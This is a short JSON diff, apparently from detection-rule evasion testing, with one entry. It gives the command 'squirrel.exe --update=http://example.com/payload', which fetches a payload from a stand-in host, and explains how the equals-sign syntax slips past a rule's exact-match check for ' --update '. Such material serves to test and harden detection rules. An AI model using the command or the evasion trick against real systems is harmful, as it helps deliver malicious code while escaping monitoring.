@@ -1,0 +1,6 @@
+[
+  {
+    "output": "squirrel.exe --update=http://example.com/payload",
+    "explanation": "Bypasses the 'selection\\_download\\_cli' condition. The rule looks for exact string matches with spaces around the arguments, such as ' --download ' or ' --update '. If the command-line parser of the application accepts alternative syntax like an equals sign or no trailing space, the exact string match fails."
+  }
+]
